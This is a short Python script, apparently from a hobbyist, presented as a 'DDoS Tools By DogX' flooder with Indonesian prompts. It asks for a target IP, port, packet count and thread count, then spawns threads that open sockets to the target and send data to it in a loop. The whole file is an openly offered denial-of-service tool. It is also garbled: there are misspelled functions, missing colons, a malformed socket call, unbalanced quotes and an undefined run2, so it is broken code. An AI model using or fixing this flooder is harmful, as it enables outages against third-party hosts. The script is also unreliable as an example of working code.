import random
import socket
import threading

print("__________________________")
print("[✓]DDoS Tools By DogX")
print("[✓]Subscribe Channel DogX")
print("Gunakan Dengan Baik/Bijak")
print("__________________________")

ip = str(input("Masukan Ip: "))
port = str(input("Port: "))
times = str(input("Paket: "))
threads = str(input("Threads(100): "))

def run ()
   data = random_unrandom(10000)
   i = random.coiche(("[Down!!]"))
   while True:
       try:
           s = socket.socket(socket.AF _INET, socket.SOCK_STREAM, socket DGRAM)
           s.connect((ip.port))
           s.send(data)
           for x in range(times)
               s.send(data)
            print([✓]"Attack!!)
          except socket.error:
             s.close()
             print("[•]Attack By DogX"
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
for y in range(threads):
    th = threading.Thread(target = run2)
    th.start()
    
    
    
    
